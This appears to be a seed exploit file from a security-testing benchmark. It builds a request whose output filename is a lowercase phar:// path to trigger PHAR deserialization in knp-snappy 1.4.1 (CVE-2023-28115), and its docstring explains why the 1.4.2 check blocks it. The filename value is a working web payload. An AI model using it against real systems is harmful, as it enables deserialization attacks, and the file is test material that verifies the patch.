#!/usr/bin/env python3
"""[GIVEN] CVE-2023-28115 seed exploit — lowercase phar:// deserialization trigger.

Calls the /trigger endpoint with a lowercase phar:// output filename.  On V0
(knp-snappy 1.4.1, no phar guard), file_exists('phar://...') triggers PHAR
metadata deserialization and the benign gadget writes the marker.  On V1
(knp-snappy 1.4.2), the case-sensitive strpos check rejects the lowercase
'phar://' prefix before file_exists is reached => BLOCKED.

Contract: reaches flag on V0, blocked on V1.
"""
from __future__ import annotations

# Lowercase phar:// — the original CVE-2023-28115 vector.
PHAR_PATH = "phar:///app/evil.phar/x"


def candidate() -> dict:
    """The request candidate for this seed."""
    return {
        "probe_id": "cve-2023-28115-lowercase-phar",
        "filename": PHAR_PATH,
    }


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
